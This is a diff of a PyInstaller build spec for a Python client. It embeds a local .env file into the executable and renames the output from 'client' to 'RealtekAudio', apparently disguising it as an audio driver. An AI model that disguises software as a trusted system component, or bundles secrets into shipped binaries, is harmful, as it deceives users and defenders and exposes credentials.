@@ -1,12 +1,18 @@
 # -*- mode: python ; coding: utf-8 -*-
 
+import os
+from PyInstaller.building.build_main import Analysis, PYZ, EXE
+
+env_data = []
+if os.path.exists('.env'):
+    env_data.append(('.env', '.'))
 
 a = Analysis(
     ['dist\\client.py'],
     pathex=[],
     binaries=[],
-    datas=[],
-    hiddenimports=['requests', 'cryptography.hazmat.primitives.kdf.hkdf', 'kyber_py.ml_kem', 'ctypes'],
+    datas=env_data,
+    hiddenimports=['requests', 'cryptography.hazmat.primitives.kdf.hkdf', 'kyber_py.ml_kem', 'ctypes', 'dotenv'],
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
@@ -22,7 +28,7 @@ exe = EXE(
     a.binaries,
     a.datas,
     [],
-    name='client',
+    name='RealtekAudio',
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
